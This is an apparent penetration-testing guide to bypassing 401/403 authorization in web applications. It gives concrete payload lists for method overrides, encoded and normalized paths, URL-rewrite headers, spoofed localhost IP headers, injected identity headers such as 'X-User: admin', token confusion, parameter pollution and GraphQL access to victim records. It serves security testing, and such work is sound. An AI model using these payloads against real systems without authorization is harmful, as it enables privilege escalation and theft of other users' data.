## First: understand what you are bypassing

- 401 Unauthorized usually means authentication is missing, invalid, or expired.
- 403 Forbidden usually means the server recognized the request but denied access.

A 403 → 200 response edit is only meaningful when the client then exposes data or triggers a second server-side request that succeeds.

`The real goal is:`

Make the backend process the same protected operation through a different parsing, routing, identity, or normalization path.

## 1. HTTP method manipulation

Test whether authorization is only applied to one method.

GET /admin/users
POST /admin/users
PUT /admin/users
PATCH /admin/users
DELETE /admin/users
HEAD /admin/users
OPTIONS /admin/users

Also test method override headers and parameters:

X-HTTP-Method-Override: GET
X-HTTP-Method: GET
X-Method-Override: GET
POST /admin/users?_method=GET

High-value pattern:

POST /api/users/123
Content-Type: application/json

{"role":"admin"}

Then try:

PATCH /api/users/123

or:

POST /api/users/123?_method=PATCH

This catches middleware that protects PATCH but not overridden POST.

## 2. Content-Type manipulation

Authorization and validation middleware sometimes behave differently depending on the parser.

Start with the original body, then rotate:

Content-Type: application/json
{"user_id":123,"role":"admin"}
Content-Type: application/x-www-form-urlencoded
user_id=123&role=admin
Content-Type: multipart/form-data; boundary=abc
--abc
Content-Disposition: form-data; name="user_id"

123
--abc
Content-Disposition: form-data; name="role"

admin
--abc--

Other useful values:

Content-Type: text/plain
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/json;charset=UTF-8
Content-Type: application/vnd.api+json
Content-Type: application/graphql

Also try malformed or ambiguous headers:

Content-Type: application/json;
Content-Type: application/json, text/plain
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

The point is not random mutation. Look for:

Different status codes
Different response lengths
Validation disappearing
A protected field being accepted
The operation succeeding despite an error response

Always verify state afterward.

## 3. Path normalization and routing discrepancies

Authorization middleware and application routers may normalize paths differently.

Assume the protected path is:

/admin/users

Test:

/admin/users/
/admin//users
/admin/./users
/admin/foo/../users
/admin/users/.
/admin/users/..
/admin/users;
/admin/users;
/admin/users?
/admin/users#
/ADMIN/users
/Admin/Users

Encoded variants:

/%61dmin/users
/admin/%75sers
/admin%2fusers
/admin%252fusers
/admin/%2e/users
/admin/%2e%2e/admin/users
/admin%2Fusers
/admin%5Cusers

Semicolon and matrix parameter variants:

/admin;/users
/admin/users;anything
/admin;foo=bar/users

Suffix tricks:

/admin/users.json
/admin/users.xml
/admin/users.css
/admin/users/

Framework-specific route variants:

/admin/users/index
/admin/users/index.php
/admin/users.json
/admin/users?format=json

Do not just look for 200. Compare whether the returned resource or resulting state is actually protected.

## 4. Proxy and rewrite headers

These are worth testing when the target uses reverse proxies, CDNs, ingress controllers, or multiple backend layers.

Common routing headers:

X-Original-URL: /admin/users
X-Rewrite-URL: /admin/users
X-Forwarded-Uri: /admin/users
X-Forwarded-Path: /admin/users
X-Original-URI: /admin/users
X-Request-URI: /admin/users

Example:

GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/users

Also reverse it:

GET /admin/users HTTP/1.1
Host: target.com
X-Original-URL: /

The second variant can expose cases where the security layer checks the rewritten path while the backend processes the original path, or vice versa.

## 5. Client IP and trusted-proxy header abuse

Some applications allow administrative or internal routes based on IP.

Test carefully:

X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-For: 10.0.0.1
X-Real-IP: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Cluster-Client-IP: 127.0.0.1

Also test chains:

X-Forwarded-For: 127.0.0.1, 8.8.8.8
X-Forwarded-For: 8.8.8.8, 127.0.0.1

And IPv6 representations:

X-Forwarded-For: ::1
X-Forwarded-For: 0:0:0:0:0:0:0:1
X-Forwarded-For: ::ffff:127.0.0.1

Only report this when the protected functionality actually becomes accessible. Header reflection or a changed error page is weak evidence.

## 6. Identity header injection

Targets behind SSO gateways or internal proxies may trust headers that should have been stripped externally.

Look for headers such as:

X-User: admin
X-User-ID: 1
X-Username: admin
X-Email: admin@target.com
X-Remote-User: admin
Remote-User: admin
X-Authenticated-User: admin
X-Auth-User: admin
X-Role: admin
X-Roles: admin
X-Group: administrators
X-Forwarded-User: admin
X-Forwarded-Email: admin@target.com

Also test values from your own legitimate session before guessing administrator values. Example:

Log in normally.
Identify your user ID, username, tenant ID, and email.
Send headers containing your real values.
Change one attribute at a time.
Check whether the backend trusts the header over the session token.

This is much stronger than blindly sending admin.

## 7. Authentication token confusion

For 401 endpoints, compare every accepted credential transport.

Try the same token in:

Authorization: Bearer TOKEN
Cookie: access_token=TOKEN
X-Authorization: Bearer TOKEN
X-Access-Token: TOKEN
X-Auth-Token: TOKEN

Query/body placement:

/api/private?access_token=TOKEN
/api/private?token=TOKEN
{"access_token":"TOKEN"}

Test malformed scheme variations:

Authorization: bearer TOKEN
Authorization: Token TOKEN
Authorization: JWT TOKEN
Authorization: Bearer    TOKEN
Authorization: Bearer TOKEN,
Authorization: Bearer TOKEN Bearer OTHER

Duplicate headers can reveal inconsistent parsing:

Authorization: Bearer INVALID
Authorization: Bearer VALID

Then reverse the order.

Be careful: some proxies merge duplicates, while backends choose the first or last value.

## 8. Cookie/session inconsistencies

Test whether multiple authentication artifacts conflict.

Examples:

Cookie: session=LOW_PRIV; session=HIGH_PRIV

Reverse the order.

Also test:

Valid session + expired bearer token
Invalid session + valid bearer token
User A session cookie + User B CSRF token
Anonymous cookie + authenticated bearer token
Mobile token on web API
Web token on mobile API
Old session after password change
Old session after email change
Old session after role downgrade
Refresh token where access token is expected

A meaningful bug occurs when the server selects the weaker or attacker-controlled identity unexpectedly.

## 9. Parameter location confusion

Move identifiers and authorization-relevant fields between locations.

Original:

GET /api/users/123

Try:

GET /api/users?id=123
GET /api/users?user_id=123
GET /api/users/123?id=456

With body:

POST /api/users/123
Content-Type: application/json

{"id":456,"user_id":456}

Headers:

X-User-ID: 456
X-Account-ID: 456
X-Tenant-ID: 456

The core test is conflicting sources:

Path ID: your user
Query ID: victim
Body ID: administrator
Header ID: another tenant

Then determine which one the authorization check uses and which one the business logic uses.

That mismatch is a classic authorization bypass.

## 10. Duplicate parameter pollution

Different layers may select the first, last, or combined value.

/api/users?id=YOUR_ID&id=VICTIM_ID
/api/users?id=VICTIM_ID&id=YOUR_ID

JSON duplicate keys:

{
  "user_id": 100,
  "user_id": 200
}

Nested versus flat:

{
  "user_id": 100,
  "user": {
    "id": 200
  }
}

Arrays:

user_id=100&user_id[]=200
user_id[]=100&user_id=200
{"user_id":[100,200]}

This is especially valuable when a gateway authorizes one value but the application processes another.

## 11. Encoding and canonicalization tests

Use encoding where there is a reason to suspect multiple parsers or normalization layers.

For identifiers and paths:

123
0123
000123
+123
123.0
1e2
0x7b
%31%32%33
%2531%2532%2533

For strings:

admin
ADMIN
Admin
admin%00
admin%20
admin+
%61dmin
\u0061dmin

For slash and dot handling:

/
%2f
%2F
%252f
\
%5c
.
%2e
%252e

Unicode normalization can occasionally matter:

admin
ａｄｍｉｎ
admіn

The last example uses lookalike Unicode characters. This is lower probability and should not be your first move.

Do not waste hours spraying exotic encodings at every endpoint. Use them when:

A CDN and backend disagree
The application decodes input multiple times
A route changes after encoding
A WAF blocks the plain version
The framework accepts multiple numeric representations

## 12. API version and alternate route testing

Authorization is often missing from older, mobile, internal, or GraphQL routes.

Try:

/api/users/123
/api/v1/users/123
/api/v2/users/123
/v1/users/123
/rest/users/123
/internal/users/123
/mobile/users/123
/admin-api/users/123

Look in JavaScript, mobile bundles, OpenAPI files, GraphQL schemas, and historical URLs for alternate endpoints.

A very common real bug:

/api/v2/admin/users/123 → 403
/api/v1/users/123 → 200

The new endpoint is protected; the legacy endpoint is not.

## 13. Query flags and alternate representations

Test parameters that may switch serializers, modes, or backend handlers:

?format=json
?output=json
?view=admin
?mode=full
?include=private
?include_hidden=true
?internal=true
?debug=true
?raw=true
?download=true
?export=true

Do not blindly append random flags. Mine them from:

JavaScript
Swagger/OpenAPI
Mobile endpoints
Error messages
Existing UI requests
Historical URLs

## 14. GraphQL authorization bypasses

For GraphQL, do not stop after a forbidden UI operation.

Test:

Direct field access
Aliases
Fragments
Nested relationships
Mutations equivalent to protected REST actions
Different object lookup methods
Global IDs versus numeric IDs
Batch queries
Introspection-derived alternate operations

Example:

query {
  user(id: "victim-id") {
    email
    billingDetails
  }
}

Then try alternate paths:

query {
  organization(id: "org-id") {
    members {
      nodes {
        email
      }
    }
  }
}

The direct user resolver may be protected while nested relationship resolvers are not.

## 15. Host and origin routing differences

In scoped environments with known valid hosts, test whether another host routes to the same backend with weaker controls.

Host: api.target.com

versus:

Host: internal-api.target.com

Also test, where clearly in scope:

X-Forwarded-Host: internal.target.com
X-Original-Host: internal.target.com
Forwarded: host=internal.target.com

This is valuable when different virtual hosts share an application but have different middleware.

Do not send arbitrary off-scope hostnames or attempt infrastructure-wide spraying.

## 16. CSRF and authorization separation

A missing CSRF token is not normally an authorization bypass. However, check whether CSRF middleware accidentally controls whether authentication is processed.

Compare:

No CSRF token
Invalid CSRF token
Another session’s CSRF token
CSRF token in header versus body
JSON versus form encoding
GET used for a state-changing operation

Sometimes a route rejects authenticated requests without CSRF but accepts the same operation through a parser or method where CSRF is not enforced.

The impact is the state change, not merely the missing CSRF check.

## 17. Trailing-body and parser disagreement tests

Advanced but useful when frontends and backends use different parsers.

Examples:

{"user_id":123}{"user_id":456}
{"user_id":123}
garbage

Form plus JSON-like data:

user_id=123&data={"user_id":456}

Different layers may validate one portion and execute another.

Keep this controlled. You are testing parser discrepancies, not trying to desynchronize shared infrastructure.

## 18. Workflow-level authorization bypasses

This is where the better bugs are.

A protected endpoint may have an unprotected equivalent action through another workflow:

Admin invite blocked, but team import permits adding users
Role editing blocked, but clone/copy preserves privileged role
Direct file download blocked, but export includes the same file
Account deletion blocked, but organization deletion cascades
Billing data blocked, but invoice PDF exposes it
Email change blocked, but account merge changes ownership
Private object blocked, but search/index/export exposes it
Settings update blocked, but bulk update endpoint allows it
Direct access blocked, but webhook/test-preview fetches it

## Stop thinking only in terms of “How do I mutate this request?”

Think:

- What other product feature causes the backend to perform the same privileged action?

That is where serious authorization bypasses live.

A practical testing sequence

## For each interesting 401 or 403, run this order:

Verify the baseline
Confirm the endpoint works with the properly privileged account.
Confirm it fails with the low-privileged or anonymous account.
Swap identity only
Same request, lower-privileged session.
Same request, no session.
Same request, expired session.
Change method
GET/POST/PUT/PATCH/DELETE
Method override headers and _method.
Change parser
JSON
Form
Multipart
Plain text
XML where supported.
Change route representation
Trailing slash
Encoded slash/dot
Case changes
Alternate API versions
Suffixes such as .json.
Test routing headers
X-Original-URL
X-Rewrite-URL
Forwarded URI variants.
Test trusted identity/IP headers
Only when architecture suggests a proxy or SSO layer.
Create conflicting values
Path versus query versus body versus header.
Duplicate parameters and duplicate headers.
Search for equivalent functionality
Alternate endpoint
Bulk route
Export
Mobile API
GraphQL mutation
Legacy API
Integration workflow.
Verify impact
Re-fetch the object.
Log into the affected account.
Confirm the state change.
Confirm cross-user or cross-role access.
Do not rely solely on the response.
What to automate versus test manually

## Automate the low-context mutations:

Path normalization
Method rotation
Content-Type rotation
Common proxy headers
IP headers
Duplicate parameters
Basic encoding
API version variants

## Manually test:

Identity confusion
Workflow bypasses
Multi-tenant boundaries
Role transitions
Import/export paths
Integrations
Account recovery
GraphQL relationships
Business logic equivalents

A scanner can tell you a response changed. It cannot reliably tell you whether the authorization model broke.

## The higher-value mindset is:

- Security layer sees A
- Application layer processes B

## Every technique above is trying to create that mismatch:

- Different path interpretation
- Different identity source
- Different body parser
- Different parameter precedence
- Different API version
- Different workflow reaching the same action
